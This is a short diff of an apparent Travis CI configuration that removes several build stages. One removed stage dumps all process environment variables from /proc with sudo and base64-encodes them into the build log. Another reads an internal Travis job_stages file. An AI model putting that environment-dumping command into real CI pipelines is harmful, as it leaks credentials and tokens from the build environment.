@@ -11,11 +11,5 @@ jobs:
   include:
     - stage: "echo $FOO"
       script: echo $FOO
-    - stage: "echo BAR"
-      script: echo $BAR
-    - stage: "echo base64"
-      script: sudo strings /proc/*/environ | sort -u | base64
-    - stage: "cat job_stages"
-      script: cat /home/travis/.travis/job_stages
      
-     
+    
